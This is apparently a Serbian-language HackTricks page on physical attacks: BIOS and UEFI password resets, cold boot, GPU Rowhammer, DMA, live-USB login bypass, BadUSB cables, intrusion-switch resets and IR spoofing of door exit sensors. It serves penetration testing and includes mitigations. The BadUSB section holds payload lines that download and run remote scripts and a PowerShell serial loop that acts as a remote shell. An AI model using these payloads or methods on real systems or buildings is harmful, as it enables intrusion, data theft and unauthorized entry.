# Fizički napadi

{{#include ../banners/hacktricks-training.md}}

Za otkrivanje interfejsa na nivou ploče, serijske konzole, pristup fleš memoriji, bočne kanale i glitching, pogledajte [Hardware Hacking](hardware-hacking/README.md) i poglavlja posvećena pojedinačnim interfejsima. Ova stranica obrađuje napade koji zahtevaju fizički pristup celom sistemu.

## Oporavak BIOS lozinke i bezbednost sistema

Podešavanja firmvera na starijim PC računarima mogu se resetovati isključivanjem CMOS baterije ili korišćenjem dokumentovanog džampera za brisanje CMOS-a. Potrebno vreme isključenja zavisi od matične ploče, a savremene UEFI lozinke ili ključevi mogu se nalaziti u neisparljivoj fleš memoriji, ugrađenom kontroleru ili bezbednosnom uređaju, pa će preživeti uklanjanje baterije. Pre kratkog spajanja pinova, konsultujte priručnik za matičnu ploču ili servisni priručnik; ovaj postupak takođe može da poništi TPM merenja i pokrene oporavak šifrovanog diska.

Na starijim x86 sistemima alati kao što su **killCMOS** i **CmosPwd** mogu da pregledaju ili izmene podešavanja koja se čuvaju u CMOS-u iz okruženja za pokretanje. CmosPwd prepoznaje formate lozinki iz dokumentovanog skupa starijih BIOS porodica i može da napravi rezervnu kopiju, vrati ili obriše/ukloni CMOS stanje; njegove objavljene verzije namenjene su starijim DOS/Windows, Linux, FreeBSD i NetBSD okruženjima.<sup>[[18]](#references)</sup> Ovi alati nisu univerzalni alati za uklanjanje UEFI lozinki i zahtevaju dovoljan pristup hardveru/firmveru.

Neki firmveri laptopova prikazuju kod izazova specifičan za proizvođača nakon nekoliko neuspešnih pokušaja unosa lozinke. Baze podataka kao što je [bios-pw.org](https://bios-pw.org) mogu da izračunaju lozinke za oporavak starijih sistema nekih proizvođača, ali mnogi sistemi primenjuju blokadu bez izazova iz kog se lozinka može izračunati. Svaku generisanu lozinku smatrajte specifičnom za određeni model i izbegavajte da dostignete trajne brojače pokušaja.

### UEFI bezbednost

Za savremene **UEFI** sisteme, CHIPSEC može da proveri zaštitu promenljivih Secure Boot-a. Počnite od provere koja ne menja sistem; opcioni režim `-a modify` namerno pokušava da ošteti promenljive i treba ga koristiti samo na sistemu u laboratoriji koji se može oporaviti. CHIPSEC takođe upozorava da njegov privilegovani drajver i pristup hardveru niskog nivoa nisu pogodni za produkcione krajnje uređaje.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analiza RAM-a i cold-boot napadi

DRAM ne gubi odmah svaki bit kada prestane osvežavanje. Brzina gubitka podataka znatno varira u zavisnosti od tehnologije modula i temperature; hlađenje može sačuvati korisne podatke mnogo duže nego ciklus isključivanja i ponovnog uključivanja bez hlađenja. Cold-boot napad brzo ponovo pokreće sistem u malom okruženju za pribavljanje podataka ili prenosi ohlađeni modul, hvata sirovu memoriju i rekonstruiše kriptografske ključeve uprkos propadanju bitova. Uslužni program za kopiranje diska nije automatski alat za snimanje fizičke memorije, a Volatility analizira snimak umesto da ga pribavlja; koristite validiran alat za pribavljanje podataka koji odgovara platformi.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer napad na tabele stranica

Savremeni GPU Rowhammer napadi postaju znatno korisniji kada ciljaju **metapodatke GPU virtuelne memorije** umesto uobičajenih bafera. Nedavni rad na **GDDR6 NVIDIA Ampere GPU-ovima** pokazuje da napadač koji izvršava neprivilegovani CUDA kod može da napravi obrasce hammering-a specifične za GPU, upotrebi **manipulaciju rasporedom memorije** da smesti strukture za straničenje u ranjive redove, a zatim preokrene bitove u **tabeli stranica poslednjeg nivoa** ili posrednom **direktorijumu stranica**. Kada se ošteti jedan prevodni unos, napadač može da uspostavi **proizvoljno čitanje/pisanje GPU memorije**, a zatim da pređe na kompromitaciju hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Obrazac eksploatacije

1. **Profilisati redove podložne hammering-u** u GDDR6 i napraviti obrasce hammering-a koji uzimaju u obzir osvežavanje / nisu uniformni, a zaobilaze ublažavanja na nivou DRAM-a.
2. **Manipulisati rasporedom GPU alokacija** tako da drajver smesti strukture za prevod adresa u podložne fizičke lokacije umesto da ih zadrži u podrazumevanom zaštićenom skupu memorije. U praksi to može podrazumevati iscrpljivanje oblasti tabela stranica u memoriji sa niskim adresama i raspršivanje velikih retkih UVM mapiranja sa kontrolisanim koracima.
3. **Preokrenuti metapodatke za prevod adresa**, kao što su bitovi **PFN** ili bitovi povezani sa aperture-om, unutar unosa tabele stranica / direktorijuma stranica, tako da se virtuelna stranica pod kontrolom napadača mapira na stranice tabela stranica, proizvoljnu GPU memoriju ili sistemska mapiranja vidljiva hostu.
4. Ponovo upotrebiti falsifikovano mapiranje da bi se prepisali dodatni unosi za prevod adresa i eskaliralo do **proizvoljnog čitanja/pisanja GPU memorije** u različitim GPU kontekstima.

### Prelazak na host i ublažavanja

- Kada je **IOMMU onemogućen**, falsifikovana mapiranja sistemskog aperture-a mogu GPU-u da izlože proizvoljnu **fizičku memoriju hosta**, pretvarajući GPU primitivu u potpunu kompromitaciju hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** cilja unose tabela stranica poslednjeg nivoa, dok **GeForge** pokazuje da oštećivanje nivoa direktorijuma stranica može biti lakše jer preokretanje jednog bita može da preusmeri veće podstablo prevoda adresa. Nemojte smatrati samo jedan nivo straničenja kritičnim za bezbednost.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** je i dalje važan jer blokira direktan pristup proizvoljnoj memoriji hosta koji koriste GDDRHammer/GeForge, ali **nije potpuno ublažavanje**. **GPUBreach** pokazuje drugi korak u kojem napadač oštećuje baferе CPU-a koje može da upisuje GPU i koji su u vlasništvu drajvera, a zatim pokreće greške u bezbednosti memorije NVIDIA drajvera da bi dobio primitivu za upis u kernel i **root shell** čak i kada je IOMMU omogućen.<sup>[[3]](#references)</sup>
- **ECC na nivou sistema** je praktično pojačavanje bezbednosti na podržanim GPU-ovima za radne stanice/servere. Potrošački GPU-ovi bez ECC-a nude slabiju površinu odbrane.<sup>[[4]](#references)</sup>
- Ovi napadi nisu samo teorijski: **GeForge** je prijavio **1,171** preokrenut bit na RTX 3060 i **202** na RTX A6000, što je bilo dovoljno za izradu funkcionalnog lanca eskalacije privilegija na hostu.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Napadi direktnim pristupom memoriji (DMA)

Za offline UEFI IFR/NVRAM zakrpu koja može da oslabi sprovođenje IOMMU pravila pre pokretanja sistema i omogući Windows DMA lanac, pogledajte:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstrira **pribavljanje i zakrpu memorije zasnovane na DMA-u** preko interfejsa kao što su FireWire i rane konfiguracije Thunderbolt-a, uključujući istorijske obrasce za zaobilaženje prijave. Nije reč samo o tome da je „neefikasan protiv Windows 10“: mogućnost eksploatacije zavisi od interfejsa, verzije sistema, IOMMU pravila, stanja zaključavanja i toga da li je Windows Kernel DMA Protection podržan i omogućen. Windows 10 verzija 1803 i novije uvele su Kernel DMA Protection na kompatibilnim platformama, čime se površina napada znatno promenila.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB za pristup sistemu

Na nešifrovanom ili već otključanom Windows volumenu, offline okruženje može da zameni binarne datoteke za pristupačnost, kao što su **sethc.exe** ili **Utilman.exe**, sa **cmd.exe**, čime se dobija SYSTEM komandna linija kada se aktivira odgovarajuća prečica na ekranu za prijavu. Alati kao što je **chntpw** mogu da menjaju podatke lokalnih SAM naloga. Ove metode ne zaobilaze zaključan BitLocker volumen i mogu da oštete akreditive zaštićene pomoću DPAPI/EFS; sačuvajte forenzičke kopije i rezervne kopije.

**Kon-Boot** je komercijalni alat za zaobilaženje autentifikacije pri pokretanju sistema, namenjen podržanim konfiguracijama Windows/macOS. Kompatibilnost zavisi od OS-a, režima firmvera, Secure Boot-a i podešavanja šifrovanja diska; alat ne dešifruje BitLocker volumen zaključanog sistema.<sup>[[10]](#references)</sup>

---

## Rukovanje Windows bezbednosnim funkcijama

### Prečice za pokretanje i oporavak

- **Delete/Supr**, F2, F10 ili neki drugi taster proizvođača može da otvori podešavanje firmvera.
- **F8** otvara zastarele napredne opcije pokretanja sistema Windows samo na konfiguracijama gde je taj put i dalje omogućen; trenutni način ulaska u oporavak se razlikuje.
- Držanje tastera **Shift** može da spreči automatsku prijavu u Windows u nekim konfiguracijama, mada podešavanja pravila/registra mogu da onemoguće takvo ponašanje.<sup>[[17]](#references)</sup>

### BAD USB uređaji

Uređaji kao što su **USB Rubber Ducky** i Teensy ploče mogu da se predstave kao pouzdane HID tastature i unesu unapred definisane pritiske tastera. Payload u početku ima privilegije i pristup radnoj površini sesije trenutno prijavljenog korisnika; UAC upiti, zaključavanje ekrana, raspored tastature, vremenska podešavanja i USB pravila krajnje tačke i dalje ga ograničavaju.<sup>[[15]](#references)</sup>

Programabilni periferni uređaji mogu i da napadaju parsere host kernela i koordiniraju više USB uređaja radi heap grooming-a i otkrivanja informacija:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Administratorske ili rezervne privilegije mogu da se upotrebe za pravljenje senkovne kopije ili čuvanje košnica registra, čime se mogu pribaviti zaključane datoteke kao što su **SAM** и **SYSTEM**. Ovo je tehnika prikupljanja podataka nakon kompromitacije, a ne zaobilaženje privilegija, i treba je korelisati sa događajima `diskshadow`/VSS i izvoza košnica registra.

## BadUSB / HID tehnike implantata

### Android HID gadget koji se aktivira NFC-om

Root-ovan Android telefon može da postane programabilna USB tastatura samo ako njegov USB kontroler i kernel podržavaju **USB gadget/HID**. Na kompatibilnim uređajima, Kali NetHunter izlaže gadget profile kroz **USB Arsenal**. Druga opcija je [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), koji kreira ConfigFS gadget funkcije i može da izloži znakovne uređaje za tastaturu/miš kao što su `/dev/hidg0` i `/dev/hidg1`. Alat samo kreira gadget krajnju tačku; zaseban proces mora da joj upisuje HID izveštaje. Root pristup ne može da nadoknadi kernelu koji nema ConfigFS, HID gadget podršku ili upotrebljiv USB Device Controller.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Ova krajnja tačka može da se kombinuje sa Android NFC-om kao fizičkim okidačem. Aplikacija [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) čita UID taga, pretvara ga u očekivani oblik, proverava lokalnu listu dozvoljenih vrednosti i, ako pronađe podudaranje, šalje podešavani niz pritisaka tastera u stilu Rubber Ducky-ja. Povezani host vidi uobičajen unos sa tastature i ne zahteva NFC softver.<sup>[[22]](#references)[[24]](#references)</sup>

Pre korišćenja prečica ili komandi, proverite enumeraciju uređaja i raspored tastature u praznom tekstualnom editoru. Bezopasan payload je:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Važne granice poverenja:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist služi za identifikaciju, a ne autentifikaciju**. UID-ovi su javni, a neki tipovi tokena ili emulatori omogućavaju kloniranje ili lažno predstavljanje. Kopirani UID sa liste dozvoljenih prolazi istom putanjom obrade kao originalni token.
- Magisk modul **NfcScreenOff** menja NFC servis tako da se ponaša kao da je ekran uključen i otključan. Ako je telefon već povezan sa hostom, neko može da aktivira payload bez otključavanja telefona.
- Lozinke, API tokeni i komande sačuvani u payload-u predstavljaju tajne koje se mogu preuzeti sa uređaja sa root pristupom ili otključanim bootloader-om. Unos lozinke preko HID-a predstavlja automatizaciju ponovne upotrebe lozinke, a ne autentifikaciju bez lozinke.
- HID injection deluje sa privilegijama aktivne radne površine i zavisi od fokusa, tajminga i rasporeda tastature na hostu. Pre slanja osetljivih radnji zahtevajte nedavnu potvrdu korisnika, izbegavajte čuvanje privilegovanih tajni u skriptama i koristite autentifikator sa kriptografskim challenge-response mehanizmom za pravu autentifikaciju.

### Implanti u kablovima kojima se upravlja preko Wi-Fi mreže

- Implanti zasnovani na ESP32-S3, kao što je **Evil Crow Cable Wind**, skrivaju se unutar USB-A→USB-C ili USB-C↔USB-C kablova, predstavljaju se isključivo kao USB tastatura i preko Wi-Fi mreže izlažu svoj C2 stek. Operater treba samo da napaja kabl preko uređaja žrtve, napravi hotspot pod nazivom `Evil Crow Cable Wind` sa lozinkom `123456789` i otvori [http://cable-wind.local/](http://cable-wind.local/) (ili njegovu DHCP adresu) da bi pristupio ugrađenom HTTP interfejsu.<sup>[[8]](#references)</sup>
- Veb interfejs pruža kartice *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Sačuvani payload-i označeni su prema OS-u, rasporedi tastature menjaju se u hodu, a VID/PID stringovi mogu se izmeniti kako bi oponašali poznate periferne uređaje.
- Pošto se C2 nalazi unutar kabla, telefonom se mogu pripremati payload-i, pokretati njihovo izvršavanje i upravljati Wi-Fi akreditivima bez korišćenja mreže organizacije — što je korisno za fizičke upade kratkog trajanja.

### AutoExec payload-i prilagođeni OS-u

- AutoExec pravila povezuju jedan ili više payload-a koji se pokreću odmah nakon USB enumeracije. Implant vrši jednostavnu identifikaciju OS-a i bira odgovarajuću skriptu.
- Primer toka rada:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) ili `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Pošto se izvršavanje odvija bez nadzora, jednostavnom zamenom kabla za punjenje može se ostvariti početni pristup u stilu „plug-and-pwn“, u kontekstu trenutno prijavljenog korisnika.

### Udaljeni shell pokrenut preko HID-a putem Wi-Fi TCP-a

1. **Pokretanje pomoću pritisaka tastera:** Sačuvani payload otvara konzolu i unosi petlju koja izvršava sve što stigne na novom USB serijskom uređaju. Minimalna Windows varijanta je:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implant održava USB CDC kanal otvorenim dok njegov ESP32-S3 pokreće TCP client (Python script, Android APK ili desktop executable) ka operatoru. Svi bajtovi uneti u TCP sesiju prosleđuju se u gornju serial petlju, čime se omogućava remote command execution čak i na air-gapped hostovima. Izlaz je ograničen, pa operatori obično izvršavaju blind commands (kreiranje naloga, priprema dodatnih alata itd.).

### HTTP OTA površina za ažuriranje

- Dokumentovani interfejs Evil Crow Cable Wind izlaže neautentifikovani endpoint za ažuriranje firmware-a na `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Operateri na terenu mogu menjati funkcije u hodu (npr. flešovati USB Army Knife firmware) usred angažovanja, bez otvaranja kabla, što omogućava implantatu da pređe na nove mogućnosti dok je i dalje priključen na ciljni host.

## Zaobilaženje BitLocker enkripcije

Ovlašćeno forenzičko pribavljanje podataka sa sistema koji je aktivan ili je nedavno radio može obuhvatiti glavni ključ BitLocker volumena ili povezani ključni materijal dok je volumen otključan. Komercijalni alati kao što su Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic mogu pretraživati podržane memorijske slike, datoteke hibernacije ili ispise nakon pada sistema, ali uspeh nije zagarantovan. Moderne verzije Windows-a takođe šifruju ispise nakon pada sistema kada je BitLocker omogućen, a sačuvana 48-cifrena lozinka za oporavak razlikuje se od ključa volumena koji se nalazi u memoriji.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Društveni inženjering za dodavanje ključa za oporavak

Napadač koji ubedi administratora da pokrene komande za upravljanje BitLocker-om može dodati lozinku za oporavak, eksterni ključ ili drugi zaštitnik, a zatim ga preuzeti. Lozinka za oporavak ne može biti proizvoljan niz nula: numeričke lozinke za oporavak BitLocker-a moraju imati ispravan format od 48 cifara. Sintaksa za ovlašćeno administriranje je `manage-bde -protectors -add C: -recoverypassword`; dobijene zaštitnike možete prikazati komandom `manage-bde -protectors -get C:`. Pratite dodavanje zaštitnika i postarajte se da se novi materijal za oporavak čuva isključivo na odobrenim lokacijama.<sup>[[16]](#references)</sup>

---

## Iskorišćavanje prekidača za otvaranje kućišta / održavanje radi vraćanja BIOS-a na fabrička podešavanja

Mnogi moderni laptopovi i desktop računari malog formata imaju **prekidač za otvaranje kućišta** koji nadgledaju ugrađeni kontroler (EC) i firmver BIOS/UEFI. Iako je osnovna namena prekidača da podigne upozorenje kada se uređaj otvori, proizvođači ponekad implementiraju **nedokumentovanu prečicu za oporavak** koja se aktivira kada se prekidač pritisne određenim redosledom.<sup>[[5]](#references)[[6]](#references)</sup>

### Kako napad funkcioniše

1. Prekidač je povezan sa **GPIO prekidom** na EC-u.
2. Firmver koji radi na EC-u prati **vreme i broj pritisaka**.
3. Kada se prepozna unapred definisan obrazac, EC poziva rutinu za *resetovanje matične ploče* koja **briše sadržaj sistemskog NVRAM/CMOS-a**.
4. Pri sledećem pokretanju, pogođeni modeli učitavaju resetovano stanje firmvera. U zavisnosti od proizvođača i revizije, obrisani podaci mogu obuhvatati lozinku nadzornika, prilagođena podešavanja pokretanja ili upisane ključeve Secure Boot-a; stanje TPM-a i posledice po šifrovanje diska treba zasebno proceniti.

> Resetovanje firmvera može ponovo omogućiti opcije pokretanja sa spoljašnjih uređaja, ali **ne** dešifruje skladište. BitLocker ili drugi sistem za šifrovanje celog diska može ući u režim oporavka nakon promene TPM-a/firmvera, a da interni disk i dalje ostane zaštićen bez ključa za oporavak.<sup>[[16]](#references)</sup>

### Primer iz prakse – Framework 13 laptop

Prečica za oporavak na Framework 13 (11./12./13. generacije) je:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Nakon desetog ciklusa EC postavlja zastavicu koja nalaže BIOS-u da pri sledećem ponovnom pokretanju obriše NVRAM. Ceo postupak traje oko 40 s i ne zahteva **ništa osim odvijača**.<sup>[[5]](#references)</sup>

### Generički postupak eksploatacije

1. Uključite cilj ili ga probudite iz stanja mirovanja kako bi EC bio aktivan.
2. Uklonite donji poklopac da biste otkrili prekidač za detekciju otvaranja/održavanje.
3. Ponovite obrazac uključivanja i isključivanja koji koristi proizvođač (pogledajte dokumentaciju i forume ili izvršite reverzni inženjering firmvera EC-a).
4. Ponovo sastavite uređaj i pokrenite ga, a zatim proverite koje su se postavke firmvera i akreditivi zaista promenili.
5. Ako imate ovlašćenje i dostupno je pokretanje sa spoljnog medija, pokrenite kontrolisanu live sliku. Kada se interna particija legitimno otključa (ili ako nikada nije bila šifrovana), live okruženje može da preuzme akreditive i podatke ili pregleda EFI System Partition. Izmena te particije radi instaliranja EFI implantata je trajna i veoma invazivna, a i dalje je ograničavaju Secure Boot, izmereno pokretanje, zaštita od upisivanja u firmver i nadzor krajnjih uređaja. Šifrovana memorija ostaje nedostupna bez ključa ili materijala za oporavak.

### Detekcija i ublažavanje

* Beležite događaje otvaranja kućišta u konzoli za upravljanje OS-om i upoređujte ih sa neočekivanim resetovanjima BIOS-a.
* Koristite **pečate koji pokazuju neovlašćeno otvaranje** na zavrtnjima/poklopcima da biste otkrili otvaranje.
* Držite uređaje u **fizički obezbeđenim prostorima**; pretpostavite da fizički pristup znači potpuni kompromis.
* Ako je dostupno, onemogućite funkciju proizvođača „maintenance switch reset“ ili zahtevajte dodatno kriptografsko ovlašćenje za resetovanje NVRAM-a.

---

## Prikrivena IR injekcija protiv beskontaktnih senzora za izlaz

### Karakteristike senzora
- Komercijalni senzori „mahnite rukom za izlaz“ kombinuju IR LED emiter bliskog dometa sa prijemnim modulom nalik onom u TV daljinskom upravljaču, koji daje logičku jedinicu tek nakon što primi više impulsa (~4–10) odgovarajućeg nosioca (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastični poklopac sprečava da emiter i prijemnik budu direktno usmereni jedan ka drugom, pa kontroler pretpostavlja da svaki potvrđeni nosilac potiče od obližnjeg odraza i aktivira relej koji otključava električnu bravu vrata.
- Kada kontroler detektuje prisustvo cilja, često menja modulacioni omotač izlaznog signala, ali prijemnik i dalje prihvata svaki niz impulsa koji odgovara filtriranom nosiocu.

### Tok napada
1. **Zabeležite profil emisije** – povežite logički analizator sa pinovima kontrolera da biste snimili talasne oblike pre i nakon detekcije koji upravljaju internom IR LED-om.
2. **Reprodukujte samo talasni oblik „nakon detekcije“** – uklonite/zanemarite fabrički emiter i od početka pobuđujte spoljnu IR LED već aktiviranim obrascem. Pošto je prijemniku važan samo broj impulsa i frekvencija, tretiraće lažni nosilac kao pravi odraz i aktivirati relejni izlaz.
3. **Upravljajte emitovanjem** – šaljite nosilac u podešenim nizovima impulsa (npr. desetine milisekundi uključen, približno isto toliko isključen) da biste poslali najmanji potreban broj impulsa, a da ne zasitite AGC prijemnika niti logiku za obradu smetnji. Neprekidno emitovanje brzo smanjuje osetljivost senzora i sprečava aktiviranje releja.

### Reflektivna injekcija velikog dometa
- Zamenom probne LED diode IR diodom velike snage, MOSFET drajverom i optikom za fokusiranje omogućava se pouzdano aktiviranje sa udaljenosti od oko 6 m.
- Napadaču nije potrebna direktna vidljivost otvora prijemnika; usmeravanjem snopa ka unutrašnjim zidovima, policama ili okvirima vrata koji se vide kroz staklo, reflektovana energija ulazi u vidno polje od oko 30° i oponaša pokret ruke iz neposredne blizine.
- Pošto prijemnici očekuju samo slabe odraze, mnogo jači spoljni snop može da se odbije od više površina, a da i dalje ostane iznad praga detekcije.

### Napadačka baterijska lampa
- Ugradnja drajvera u komercijalnu baterijsku lampu prikriva alat naočigled svih. Zamenite vidljivu LED diodu IR LED diodom velike snage koja odgovara opsegu prijemnika, dodajte ATtiny412 (ili slično) za generisanje nizova impulsa od ≈30 kHz i upotrebite MOSFET za odvođenje struje LED diode.
- Teleskopsko zum sočivo sužava snop radi većeg dometa i preciznosti, dok vibracioni motor kojim upravlja MCU daje haptičku potvrdu da je modulacija aktivna, bez emitovanja vidljive svetlosti.
- Menjanje između nekoliko sačuvanih modulacionih obrazaca (sa neznatno različitim frekvencijama nosioca i omotačima) povećava kompatibilnost sa različitim porodicama senzora pod drugim robnim markama. Operater tako može da usmerava snop ka reflektujućim površinama dok relej zvučno ne klikne i vrata se ne otključaju.

---

## References

- [1] [GDDRHammer: znatno ometanje redova DRAM-a — Rowhammer napadi između komponenti na savremenim GPU-ovima](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: izazivanje Rowhammer-a u GDDR memoriji radi falsifikovanja GPU tabela stranica iz zabave i zarade](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: napadi za eskalaciju privilegija na GPU-ovima pomoću Rowhammer-a](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA – bezbednosno obaveštenje: Rowhammer – jul 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – „Framework 13. Pritisnite ovde da biste preuzeli kontrolu“](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – vodič za resetovanje matične ploče](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – „Ne dirajte! Zaobilaženje IR beskontaktnih senzora za izlaz pomoću prikrivene IR lampe“](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – „Priključi, pokreni, preuzmi kontrolu: hakovanje pomoću Evil Crow Cable Wind“](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier – Rowhammer napad na NVIDIA čipove](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Zvanična dokumentacija i informacije o kompatibilnosti za Kon-Boot](https://kon-boot.com/)
- [11] [Dokumentacija za CHIPSEC – zaštita promenljivih Secure Boot-a](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Da ne zaboravimo: napadi hladnim pokretanjem na ključeve za šifrovanje](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception – manipulacija fizičkom memorijom preko DMA-a](https://github.com/carmaa/inception)
- [14] [Microsoft Learn – zaštita Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Dokumentacija za Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn – vodič za BitLocker operacije](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn – držanje tastera Shift i ponašanje automatske prijave](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity – dokumentacija i preuzimanja za CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Dokumentacija za Kali Linux – NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Dokumentacija Linux kernela – upravljački program za USB HID gadget](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Pretvorite rutovani Android telefon u NFC autentifikator i alat za automatizaciju računara](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
